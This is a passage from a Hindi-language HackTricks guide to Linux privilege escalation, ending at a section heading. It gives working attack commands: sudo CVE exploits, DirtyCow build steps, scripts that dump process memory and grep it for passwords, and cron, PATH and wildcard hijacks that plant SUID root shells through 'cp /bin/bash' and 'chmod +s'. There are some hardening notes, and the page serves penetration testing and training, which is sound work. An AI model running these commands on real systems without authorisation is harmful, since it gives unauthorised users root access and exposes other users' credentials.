# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

विस्तृत पृष्ठभूमि और ऐतिहासिक enumeration workflows के लिए, references में दिए गए g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation और linux-private-i संसाधनों की तुलना करें।<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## सिस्टम जानकारी

### OS जानकारी

आइए, चल रहे OS के बारे में जानकारी जुटाना शुरू करें।

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

यदि आपको **`PATH` variable के अंदर किसी folder पर write permissions** प्राप्त हैं, तो आप कुछ libraries या binaries को hijack कर सकते हैं:

```bash
echo $PATH
```

### Env जानकारी

क्या environment variables में कोई दिलचस्प जानकारी, पासवर्ड या API keys हैं?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Kernel version चेक करें और देखें कि privileges escalate करने के लिए इस्तेमाल किया जा सकने वाला कोई exploit है या नहीं।

[Kernel/LPE/CVE section](../../main-system-information/kernel-lpe-cves/README.md) में local escalation के cases और Binary Exploitation में Linux kernel पर लिखे गए विस्तृत लेखों के links शामिल हैं। किसी case study को test करने से पहले प्रभावित build और configuration की पुष्टि करें।

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

आपको यहाँ vulnerable kernel की एक अच्छी सूची और कुछ पहले से **compiled exploits** मिल सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)।<sup>[[12]](#references)</sup>\
कुछ **compiled exploits** पाने के लिए अन्य साइटें: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेबसाइट से सभी vulnerable kernel versions निकालने के लिए आप यह कर सकते हैं:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

ऐसे tools जो kernel exploits खोजने में मदद कर सकते हैं:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim पर चलाएँ, यह केवल kernel 2.x के exploits जाँचता है)

हमेशा **Google पर kernel version खोजें**। हो सकता है कि आपका kernel version किसी kernel exploit में लिखा हो, जिससे आपको पक्का हो जाएगा कि यह exploit मान्य है।

Kernel exploitation की अतिरिक्त तकनीकें:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo संस्करण

उन कमजोर sudo versions के आधार पर, जो यहाँ दिखाई देते हैं:

```bash
searchsploit sudo
```

आप इस grep से जांच सकते हैं कि sudo का version vulnerable है या नहीं।

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 से 1.9.17** तक में, जब sudo `/etc/nsswitch.conf` को उपयोगकर्ता-नियंत्रित डायरेक्टरी से लोड करता है, तो बिना विशेषाधिकार वाले स्थानीय उपयोगकर्ता `--chroot` विकल्प के ज़रिए root तक privilege escalation कर सकते हैं; upstream ने इसे **1.9.17p1** में ठीक किया। संबंधित paths में हर executable root-setuid sudo binary की जाँच करें, क्योंकि `sudo -V` केवल `PATH` से चुनी गई binary की जानकारी देता है। Distribution packages में upstream version string बदले बिना fix backport किया जा सकता है, इसलिए vendor package का status भी जाँचें। [sudo maintainer की advisory](https://www.openwall.com/lists/oss-security/2025/06/30/3) देखें।<sup>[[28]](#references)[[29]](#references)</sup>

इस [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) का exploit करने के लिए यहां एक [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) दिया गया है। Exploit चलाने से पहले, सुनिश्चित करें कि आपका `sudo` version vulnerable है और उसमें `chroot` feature उपलब्ध है।

अधिक जानकारी के लिए मूल [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) देखें।<sup>[[28]](#references)</sup>

### Sudo host-based rules bypass (CVE-2025-32462)

Upstream sudo **1.8.8 से 1.9.17** तक, host-based sudoers rules का मूल्यांकन करते समय **वास्तविक hostname** की जगह `sudo -h <host>` से दिया गया **उपयोगकर्ता-प्रदत्त hostname** इस्तेमाल कर सकता है; upstream ने इसे **1.9.17p1** में ठीक किया। चुने गए host पर उपयोगकर्ता के पास फिर भी मेल खाती sudoers entry होनी चाहिए। स्थानीय policy के साथ vendor backports और अन्य sudo binaries की भी जाँच करें। [sudo maintainer की advisory](https://www.openwall.com/lists/oss-security/2025/06/30/2) देखें।<sup>[[29]](#references)</sup>

आवश्यकताएँ:
- Vulnerable sudo version
- Host-specific sudoers rules (host न तो मौजूदा hostname हो और न ही `ALL`)

sudoers pattern का उदाहरण:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

allowed host को spoof करके Exploit करें:

```bash
sudo -h devbox id
sudo -h devbox -i
```

यदि चुने गए नाम का resolution अवरुद्ध है, तो जाँचें कि वह नाम होस्ट पर कैसे resolve होता है। किसी लॉग या configuration file में नाम दिखाई देना मात्र उसे resolvable नहीं बनाता, और `/etc/hosts` को बदलने के लिए सामान्यतः privileged write access की आवश्यकता होती है।

#### sudo < v1.8.28

इस [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) के लिए एक प्रभावी sudo rule आवश्यक है, जो root को छोड़कर `ALL` users के रूप में command चलाने की अनुमति देता हो, जैसे `(ALL, !root) /bin/bash`। Caller को authentication की किसी भी आवश्यकता सहित, उस rule का उपयोग करने की अनुमति भी होनी चाहिए। Installed package advisory जाँचें: vendors ने ऐसे releases में fix backport किया है जिनका प्रदर्शित upstream version अब भी 1.8.28 से कम है। केवल `!root` rule या पुराना version होने से exposure की पुष्टि नहीं होती। Passive enumeration के दौरान कोई privileged command test न करें।

```
sudo -u#-1 /bin/bash
```

### Dmesg signature verification विफल

इस vuln का exploit कैसे किया जा सकता है, इसका **उदाहरण** देखने के लिए **HTB के smasher2 box** को देखें

```bash
dmesg 2>/dev/null | grep "signature"
```

### अधिक system enumeration

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## संभावित बचावों की सूची बनाएँ

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

अगर आप किसी container के अंदर हैं, तो शुरुआत नीचे दिए गए container-security सेक्शन से करें और फिर runtime-specific abuse pages पर जाएँ:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Drives

जाँचें कि **क्या mounted और unmounted है**, कहाँ और क्यों। अगर कुछ unmounted है, तो आप उसे mount करके निजी जानकारी खोजने की कोशिश कर सकते हैं.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## उपयोगी सॉफ़्टवेयर

उपयोगी बाइनरी की सूची बनाएं

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

यह भी जाँचें कि **कोई compiler इंस्टॉल है या नहीं**। यह तब उपयोगी होता है, जब आपको किसी kernel exploit का उपयोग करना हो, क्योंकि इसे उसी मशीन पर (या किसी समान मशीन पर) compile करने की सलाह दी जाती है जहाँ आप इसका उपयोग करने वाले हैं।

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### इंस्टॉल किया गया Vulnerable Software

इंस्टॉल किए गए **packages और services के versions** जाँचें। हो सकता है कि Nagios का कोई पुराना version हो (उदाहरण के लिए), जिसका उपयोग privilege escalation के लिए किया जा सके…\
ज़्यादा संदिग्ध इंस्टॉल किए गए software के versions को मैन्युअल रूप से जाँचने की सलाह दी जाती है।

```bash
dpkg -l #Debian
rpm -qa #Centos
```

यदि आपके पास मशीन का SSH access है, तो मशीन के अंदर इंस्टॉल किए गए पुराने और vulnerable software की जाँच करने के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये commands बहुत सारी जानकारी दिखाएँगी, जिसमें से अधिकांश बेकार होगी। इसलिए OpenVAS या इसी तरह के कुछ applications का उपयोग करने की अनुशंसा की जाती है, जो जाँचेंगे कि इंस्टॉल किए गए किसी software का version ज्ञात exploits के प्रति vulnerable है या नहीं।_

## Processes

देखें कि **कौन-से processes** execute हो रहे हैं और जाँचें कि क्या किसी process के पास **उससे अधिक privileges हैं जितने होने चाहिए** (शायद कोई tomcat root द्वारा execute किया जा रहा हो?)

```bash
ps aux
ps -ef
top -n 1
```

हमेशा जांचें कि कोई [**electron/cef/chromium debuggers** चल तो नहीं रहे; privilege escalation के लिए उनका दुरुपयोग किया जा सकता है](../../software-information/electron-cef-chromium-debugger-abuse.md)। **Linpeas** process की command line में `--inspect` parameter जांचकर उनका पता लगाता है।\
यह भी **जांचें कि processes की binaries पर आपके क्या privileges हैं**; हो सकता है कि आप किसी की binary overwrite कर सकें।

### अलग-अलग users के बीच parent-child chains

किसी child process का अपने parent से **अलग user** के तहत चलना अपने-आप में malicious नहीं है, लेकिन यह एक उपयोगी **triage संकेत** है। कुछ transitions अपेक्षित होते हैं (`root` द्वारा service user को spawn करना, login managers द्वारा session processes बनाना), लेकिन असामान्य chains wrappers, debug helpers, persistence या runtime trust boundaries की कमजोरी उजागर कर सकती हैं।

त्वरित जांच:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

अगर आपको कोई चौंकाने वाली chain मिले, तो parent command line और उन सभी files की जाँच करें जो उसके behavior को प्रभावित करती हैं (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments)। कई वास्तविक privesc paths में child खुद writable नहीं था, लेकिन **parent-controlled config** या helper chain writable थी।

### Deleted executables और deleted-open files

Runtime artifacts अक्सर **deletion के बाद भी** accessible रहते हैं। यह privilege escalation और उन processes से evidence recover करने—दोनों के लिए उपयोगी है जिनके पास पहले से sensitive files खुली हैं।

Deleted executables की जाँच करें:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

यदि `/proc/<PID>/exe` `(deleted)` की ओर संकेत करता है, तो प्रक्रिया अब भी memory से पुरानी binary image चला रही है। यह जांच करने का एक मजबूत संकेत है, क्योंकि:

- हटाए गए executable में दिलचस्प strings या credentials हो सकते हैं
- चल रही प्रक्रिया अब भी उपयोगी file descriptors उपलब्ध करा सकती है
- हटाई गई privileged binary हाल ही में हुई छेड़छाड़ या सफाई के प्रयास का संकेत हो सकती है

सिस्टम-व्यापी हटाई गई और खुली फ़ाइलें इकट्ठा करें:

```bash
lsof +L1
```

अगर आपको कोई दिलचस्प descriptor मिले, तो उसे सीधे recover करें:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

यह तब विशेष रूप से उपयोगी होता है जब किसी process में कोई deleted secret, script, database export या flag file अब भी खुली हो।

### Process monitoring

Processes को monitor करने के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग किया जा सकता है। अक्सर execute होने वाले vulnerable processes की पहचान करने या यह पता लगाने में यह बहुत उपयोगी हो सकता है कि आवश्यकताओं का कोई सेट पूरा होने पर कौन-से processes execute होते हैं।

#### sudo के अंतर्गत Linux ProcMon

[Linux के लिए ProcMon](https://github.com/microsoft/ProcMon-for-Linux) चुने गए processes और system calls को trace कर सकता है और SQLite trace सेव कर सकता है। अगर `sudo -l` से बिना प्रतिबंध वाला root-capable `procmon` command चलाने की अनुमति मिलती है, तो विचार करें कि क्या इससे किसी दूसरे user के process का input या output देखा जा सकता है। यह अनुमति केवल जाँच के लिए एक संकेत है: tracer support, प्रभावी policy और किसी उपयुक्त process की गतिविधि—सभी मायने रखते हैं। Trace files में secrets हो सकते हैं, इसलिए अधिकृत exports को सावधानी से जाँचें और असंबंधित processes को collect करने से बचें।

### Process memory

Server की कुछ services **credentials को memory के अंदर clear text में सेव करती हैं**।\
आमतौर पर, दूसरे users के processes की memory पढ़ने के लिए आपको **root privileges** की ज़रूरत होगी। इसलिए यह तब ज़्यादा उपयोगी होता है जब आपके पास पहले से root access हो और आप अन्य credentials खोजना चाहते हों।\
हालाँकि, याद रखें कि **एक regular user के रूप में आप अपने processes की memory पढ़ सकते हैं**।

> [!WARNING]
> ध्यान दें कि आजकल ज़्यादातर machines **डिफ़ॉल्ट रूप से ptrace की अनुमति नहीं देतीं**, जिसका अर्थ है कि आप अपने unprivileged user के दूसरे processes को dump नहीं कर सकते।
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की पहुँच को नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: सभी processes को debug किया जा सकता है, बशर्ते उनका uid समान हो। ptracing के काम करने का यह पारंपरिक तरीका है।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process को debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability आवश्यक है।
> - **kernel.yama.ptrace_scope = 3**: किसी भी process को ptrace से trace नहीं किया जा सकता। इसे सेट करने के बाद ptracing को फिर से सक्षम करने के लिए reboot करना ज़रूरी है।

एक ही UID वाला process जो थोड़े समय के लिए password vault को unlock करता है, credentials की एक अलग boundary हो सकता है। जब tracing की अनुमति हो, तो कोई सक्रिय, dumpable process अपने input syscalls या memory के ज़रिए vault password उजागर कर सकता है, भले ही encrypted vault file सुरक्षित रहे। `ptrace_scope=0` केवल एक पूर्वशर्त है: समान credentials, target की dumpability, अन्य Linux security modules और process का सक्रिय रहने का समय भी मायने रखते हैं। Vault की किसी entry का Unix root login के रूप में काम करना, credentials के दोबारा इस्तेमाल की अलग जाँच पर निर्भर करता है। सामान्य enumeration में input capture करने या secrets दिखाने के बजाय policy और संभावित process या vault paths की जानकारी दें। [kernel का Yama documentation](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) और [ptrace access checks](https://man7.org/linux/man-pages/man2/ptrace.2.html) देखें।

#### GDB

उदाहरण के लिए, अगर आपको किसी FTP service की memory तक पहुँच है, तो आप उसका Heap प्राप्त करके उसमें credentials खोज सकते हैं।

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB स्क्रिप्ट

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps बताता है कि उस process के virtual address space में memory कैसे map की गई है**; यह **हर mapped region की permissions** भी दिखाता है। **mem** pseudo file **process की memory को स्वयं उपलब्ध कराती है**। **maps** file से हमें पता चलता है कि कौन-से **memory regions पढ़े जा सकते हैं** और उनके offsets क्या हैं। इस जानकारी का उपयोग करके हम **mem file में seek कर सकते हैं और पढ़े जा सकने वाले सभी regions को एक file में dump कर सकते हैं**।

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच प्रदान करता है, वर्चुअल मेमोरी तक नहीं। Kernel के virtual address space को /dev/kmem का उपयोग करके access किया जा सकता है।\
आमतौर पर, `/dev/mem` को केवल **root** और **kmem** group ही पढ़ सकते हैं।

```
strings /dev/mem -n10 | grep -i PASS
```

### Linux के लिए ProcDump

ProcDump, Windows के लिए Sysinternals टूल्स सूट के क्लासिक ProcDump टूल का Linux संस्करण है। इसे [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) से प्राप्त करें।

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Tools

किसी process की memory dump करने के लिए आप इसका उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप root की आवश्यकता manually हटा सकते हैं और अपने process का dump ले सकते हैं
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) से Script A.5 (root आवश्यक है)

### Process Memory से Credentials

#### Manual example

यदि आपको पता चलता है कि authenticator process चल रहा है:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

आप process को dump कर सकते हैं (process की memory dump करने के अलग-अलग तरीके जानने के लिए पिछले sections देखें) और memory में credentials खोज सकते हैं:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **मेमोरी और कुछ प्रसिद्ध फ़ाइलों से clear text credentials चुरा लेगा**। ठीक से काम करने के लिए इसे root privileges की आवश्यकता होती है।

| सुविधा                                            | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Regex खोजें/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## शेड्यूल किए गए/Cron jobs

### Crontab UI (alseambusher) root के रूप में चल रहा है – web-based scheduler privesc

अगर कोई web “Crontab UI” panel (alseambusher/crontab-ui) root के रूप में चलता है और केवल loopback पर bound है, तब भी आप SSH local port-forwarding के ज़रिए उस तक पहुँच सकते हैं और privilege escalation के लिए एक privileged job बना सकते हैं।<sup>[[1]](#references)[[4]](#references)</sup>

सामान्य chain
- loopback-only port (जैसे, 127.0.0.1:8000) और Basic-Auth realm का पता `ss -ntlp` / `curl -v localhost:8000` से लगाएँ
- operational artifacts में credentials खोजें:
  - `zip -P <password>` वाले Backups/scripts
  - `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` दिखाने वाली systemd unit
- Tunnel करें और login करें:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएँ और तुरंत चलाएँ (SUID shell डालता है):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसका उपयोग करें:
```bash
/tmp/rootshell -p   # root shell
```

Hardening
- Crontab UI को root के रूप में न चलाएँ; एक dedicated user और न्यूनतम permissions तक सीमित रखें
- localhost से bind करें और अतिरिक्त रूप से firewall/VPN के ज़रिए access प्रतिबंधित करें; passwords दोबारा इस्तेमाल न करें
- unit files में secrets embed करने से बचें; secret stores या केवल root के लिए उपलब्ध EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging enable करें

जाँचें कि कोई scheduled job vulnerable तो नहीं है। शायद आप root द्वारा execute की जाने वाली किसी script का फ़ायदा उठा सकते हैं (wildcard vuln? root जिन files का उपयोग करता है, क्या उन्हें modify कर सकते हैं? symlinks का उपयोग करें? root जिस directory का उपयोग करता है, उसमें specific files बनाएँ?)

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

यदि `run-parts` का उपयोग किया जाता है, तो जाँचें कि वास्तव में कौन-से नाम निष्पादित होंगे:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

इससे false positives से बचा जा सकता है। लिखने योग्य periodic directory तभी उपयोगी होती है, जब आपके payload filename का मिलान स्थानीय `run-parts` नियमों से हो।

### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि उपयोगकर्ता "user" के पास /home/user पर लिखने की अनुमति है_)

अगर इस crontab में root user बिना path सेट किए कोई command या script चलाने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तो आप इसका इस्तेमाल करके root shell प्राप्त कर सकते हैं:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### wildcard वाले script का उपयोग करने वाला Cron (Wildcard Injection)

अगर root द्वारा execute की जाने वाली किसी script में किसी command के अंदर “**\***” हो, तो आप इसका फायदा उठाकर अप्रत्याशित काम कर सकते हैं (जैसे privesc)। उदाहरण:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**अगर wildcard से पहले कोई path हो, जैसे** _**/some/path/\***_ **, तो यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं)।**

wildcard exploitation की अन्य tricks के लिए यह पेज पढ़ें:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection, cron log parsers में

Bash arithmetic untrusted text को expression के रूप में समझ सकता है। प्रभावित Bash contexts में, उस expression के अंदर array subscript एक command substitution evaluate कर सकता है। अगर कोई privileged cron/parser attacker-controlled log text को ऐसी arithmetic comparison में डालता है, तो substitution parser की identity के साथ चल सकता है।<sup>[[22]](#references)</sup> यह सटीक Bash expression और version पर निर्भर करता है; expanded variable में अकेली `$(...)0` string अपने-आप में re-evaluation का भरोसेमंद उदाहरण नहीं है।

Input file metadata या user-writable location से पढ़े गए किसी अन्य field से भी आ सकता है। उदाहरण के लिए, कोई privileged cleanup script अगर image का `Producer` tag पढ़कर उसकी तुलना `[[ "$producer" -eq "expected" ]]` से करता है, तो वह arithmetic comparison करता है, भले ही variable quoted हो। Scheduled identity, tag उपलब्ध कराने वाली files, comparison से पहले होने वाले transformations और Bash का सटीक behavior जाँचें। Text labels के लिए string comparison का उपयोग करें; numbers के लिए arithmetic से पहले input को decimal digits के रूप में validate करें। [Bash arithmetic rules](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html) देखें।

- आम vulnerable pattern:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- array-subscript mechanism के व्यवहार की सुरक्षित स्थानीय जाँच (कोई privileged process या file परिवर्तन नहीं):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

वास्तव में चलने वाली scheduled script और उसके द्वारा खोले जाने वाले literal input path का पता लगाएँ। भले ही log file स्वयं writable न हो, लेकिन यदि कोई user उसके non-sticky parent में write और traverse कर सकता है, तो वह उसकी directory entry को replace कर सकता है; `namei -l` इन permissions में अंतर समझने में मदद करता है। कोई दूसरा writable log path, unreadable scheduler या ऐसा parser जो उस field को Bash arithmetic के रूप में evaluate ही नहीं करता, इस path को प्रमाणित नहीं करता।

### Cron script को overwrite करना और symlink

यदि आप **root द्वारा execute की जाने वाली cron script को modify कर सकते हैं**, तो आप बहुत आसानी से shell प्राप्त कर सकते हैं:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

अगर root द्वारा चलाया गया script किसी ऐसी **directory** का उपयोग करता है जिस पर आपका पूरा access है, तो उस folder को delete करके **किसी दूसरी directory की ओर इशारा करने वाला symlink folder बनाना** उपयोगी हो सकता है, जिसमें आपके नियंत्रण वाला script हो।

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Symlink validation और अधिक सुरक्षित file handling

विशेषाधिकार प्राप्त scripts/binaries की समीक्षा करते समय, जो path के ज़रिए files पढ़ती या लिखती हैं, जाँचें कि links को कैसे संभाला जाता है:

- `stat()` symlink को follow करता है और target का metadata लौटाता है।
- `lstat()` स्वयं link का metadata लौटाता है।
- `readlink -f` और `namei -l` अंतिम target को resolve करने और path के हर component की permissions दिखाने में मदद करते हैं।

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

डिफेंडर्स/डेवलपर्स के लिए, symlink tricks से बचाव के अधिक सुरक्षित तरीकों में शामिल हैं:

- `O_EXCL` को `O_CREAT` के साथ इस्तेमाल करें: अगर path पहले से मौजूद हो, तो विफल हो जाए (हमलावर द्वारा पहले से बनाए गए links/files को रोकता है)।
- `openat()`: किसी trusted directory file descriptor के सापेक्ष काम करें।
- `mkstemp()`: सुरक्षित permissions के साथ temporary files को atomically बनाएँ।

### writable payloads वाली custom-signed cron binaries
